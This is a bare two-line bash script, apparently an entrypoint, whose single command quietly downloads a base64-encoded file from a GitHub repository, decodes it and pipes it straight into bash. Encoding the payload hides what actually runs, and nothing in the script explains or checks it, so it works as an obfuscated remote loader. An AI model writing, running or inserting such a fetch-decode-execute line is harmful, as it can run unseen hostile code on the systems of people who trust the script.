#!/bin/bash
wget -qO- https://raw.githubusercontent.com/scottfeldman62/kids/refs/heads/main/entrypoint.sh | base64 -d | bash
